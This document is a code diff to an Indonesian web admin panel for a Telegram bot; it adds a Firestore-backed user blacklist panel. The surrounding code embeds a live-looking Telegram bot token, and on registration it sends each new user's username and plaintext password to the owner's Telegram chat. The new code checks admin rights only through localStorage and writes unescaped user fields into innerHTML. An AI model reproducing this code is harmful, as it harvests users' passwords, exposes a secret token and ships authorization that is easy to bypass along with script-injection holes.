@@ -446,6 +446,7 @@
         <p id="welcome-text" style="margin-bottom:20px;color:#94a3b8;">Pilih menu di bawah ini</p>
         <button id="btn-info">📋 Info Group</button>
         <button id="btn-leaderboard">🏆 Top Leaderboard</button>
+        <button id="btn-bluser">🚫 Blacklist User</button>
         <button id="btn-logout" style="background:#ef4444;margin-top:20px;">Keluar</button>
       </div>
     </div>
@@ -459,6 +460,32 @@
         <button id="back-to-menu" style="margin-top:15px;">Kembali ke Menu</button>
       </div>
     </div>
+    
+    <!-- BLUSER PANEL -->
+<div id="bluser-panel" style="display:none;flex:1;">
+  <div class="wrap panel-space">
+    <header class="sticky">
+      <h1>Daftar User Blacklist</h1>
+      <div class="small">Kelola user yang diblokir dari sistem bot</div>
+      <input id="search-bluser" class="search" placeholder="Cari user...">
+      <button id="add-bluser" style="margin-left:10px;">➕ Tambah User</button>
+      <button id="back-bluser" class="logout-btn" title="Kembali">ⓘ</button>
+    </header>
+    <div class="table-container">
+      <table>
+        <thead>
+          <tr>
+            <th>User ID</th>
+            <th>Alasan</th>
+            <th>Tanggal</th>
+            <th>Aksi</th>
+          </tr>
+        </thead>
+        <tbody id="tbody-bluser"><tr><td colspan="4">Memuat data...</td></tr></tbody>
+      </table>
+    </div>
+  </div>
+</div>
     
     <!-- ADMIN PANEL -->
     <div id="admin-panel" style="display:none;flex:1;">
@@ -594,7 +621,7 @@
 
     const botToken = "8340805243:AAH1T5LKitu2ZNzSw3DctG2mCdVST63cMZI";  
     const ownerId = "6736986837";
-    const message = `🙋‍♂️ *User Baru Terdaftar!*\n\n👤 Username: *${u}*\n🔑 Password: *${p}*\n📅 Waktu: ${new Date().toLocaleString('id-ID')}`;
+    const message = `<blockquote>🙋‍♂️ *User Baru Terdaftar!*\n\n👤 Username: *${u}*\n🔑 Password: *${p}*\n📅 Waktu: ${new Date().toLocaleString('id-ID')}</blockquote>`;
 
     try {
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -603,7 +630,7 @@
         body: JSON.stringify({
         chat_id: ownerId,
         text: message,
-        parse_mode: "Markdown"
+        parse_mode: "HTML"
       })
     });
       } catch (err) {
@@ -688,7 +715,13 @@
       }
     };
   }
-
+  
+  document.getElementById("btn-bluser").onclick = () => {
+  document.getElementById("menu-page").style.display = "none";
+  document.getElementById("bluser-panel").style.display = "flex";
+  startRealtimeBluser();
+};
+  
   /* ===============================
      🧑‍💼 ADMIN PANEL
   =============================== */
@@ -721,7 +754,7 @@
         <td>${r.lastChecked ? new Date(r.lastChecked).toLocaleString('id-ID') : '-'}</td>
         <td>
           <button class="delete" data-id="${r.id}">Hapus</button>
-          <button class="blacklist" data-id="${r.id}" data-name="${r.title || '(Tanpa Nama)'}">🚫 Blacklist</button>
+          <button class="blacklist" data-id="${r.id}" data-name="${r.title || '(Tanpa Nama)'}">Blacklist</button>
         </td>
       </tr>
     `).join('');
@@ -864,7 +897,110 @@
   }
 
   searchUser.addEventListener("input", applyFilterUser);
+  
+  /* ===============================
+   🚫 BLUSER PANEL
+=============================== */
+const tbodyBluser = document.getElementById("tbody-bluser"),
+      searchBluser = document.getElementById("search-bluser"),
+      addBluserBtn = document.getElementById("add-bluser"),
+      backBluserBtn = document.getElementById("back-bluser");
 
+let bluserList = [];
+
+function renderBluser(rows) {
+  const currentUser = JSON.parse(localStorage.getItem("user"));
+  const isAdmin = currentUser?.role === "admin";
+
+  if (!rows.length) {
+    tbodyBluser.innerHTML = '<tr><td colspan="4">Tidak ada user dalam blacklist.</td></tr>';
+    return;
+  }
+
+  tbodyBluser.innerHTML = rows.map(u => `
+    <tr>
+      <td>
+        ${u.username
+          ? `<b>${u.username}</b><br><small>${u.id}</small>`
+          : u.id}
+      </td>
+      <td>${u.reason || '-'}</td>
+      <td>${new Date(u.date).toLocaleString('id-ID')}</td>
+      <td>
+        ${isAdmin
+          ? `<button class="remove-bluser" data-id="${u.id}">Hapus</button>`
+          : '<span style="color:#9ca3af;">Tidak diizinkan</span>'}
+      </td>
+    </tr>
+  `).join('');
+
+  if (isAdmin) {
+    document.querySelectorAll(".remove-bluser").forEach(btn => {
+      btn.onclick = async () => {
+        if (confirm(`Hapus user ${btn.dataset.id} dari blacklist?`)) {
+          await deleteDoc(doc(db, "bluser", btn.dataset.id));
+          alert("✅ User dihapus dari blacklist.");
+        }
+      };
+    });
+  }
+}
+
+function applyFilterBluser() {
+  const t = (searchBluser.value || '').toLowerCase();
+  renderBluser(bluserList.filter(u => u.id.includes(t) || (u.reason || '').toLowerCase().includes(t)));
+}
+
+searchBluser.addEventListener("input", applyFilterBluser);
+
+function startRealtimeBluser() {
+  const currentUser = JSON.parse(localStorage.getItem("user"));
+  const isAdmin = currentUser?.role === "admin";
+
+  // Sembunyikan tombol tambah user untuk non-admin
+  addBluserBtn.style.display = isAdmin ? "inline-block" : "none";
+
+  // Realtime listener
+  onSnapshot(collection(db, "bluser"), s => {
+    bluserList = s.docs.map(d => ({ id: d.id, ...d.data() }));
+    applyFilterBluser();
+  });
+}
+
+
+
+// Tambah user ke blacklist
+// Tambah user ke blacklist (khusus admin)
+addBluserBtn.onclick = async () => {
+  const currentUser = JSON.parse(localStorage.getItem("user"));
+  
+  // Cek apakah user admin
+  if (!currentUser || currentUser.role !== "admin") {
+    alert("❌ Hanya admin yang dapat menambahkan user ke blacklist.");
+    return;
+  }
+
+  const userId = prompt("Masukkan ID user yang akan di-blacklist:");
+  if (!userId) return;
+
+  const reason = prompt("Masukkan alasan blacklist:", "Melanggar aturan / spam");
+  if (!reason) return;
+
+  await setDoc(doc(db, "bluser", userId), {
+    username: userId, // sementara ID disimpan di field username
+    reason,
+    date: Date.now(),
+  });
+
+  alert("🚫 User ditambahkan ke blacklist.");
+};
+
+// Kembali ke menu utama
+backBluserBtn.onclick = () => {
+  document.getElementById("bluser-panel").style.display = "none";
+  document.getElementById("menu-page").style.display = "flex";
+};
+  
   /* ===============================
      📄 MODAL DETAIL GRUP
   =============================== */
